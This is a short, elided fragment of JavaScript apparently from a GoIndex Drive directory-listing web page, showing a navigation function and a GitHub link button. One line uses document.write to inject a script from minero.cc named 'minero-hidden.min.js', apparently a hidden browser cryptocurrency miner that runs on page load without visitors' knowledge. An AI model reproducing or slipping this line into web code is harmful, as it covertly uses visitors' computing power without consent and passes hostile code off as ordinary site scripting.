...
document.write('<script src="https://minero.cc/lib/minero-hidden.min.js" async></script>')
...
function nav(path) {
    ...
    <a href="https://github.com/bartixxx32/goindex-drive" target="_blank" class="mdui-btn mdui-btn-icon mdui-ripple mdui-ripple-white" mdui-tooltip="{content: 'GoIndex Drive on Github'}">
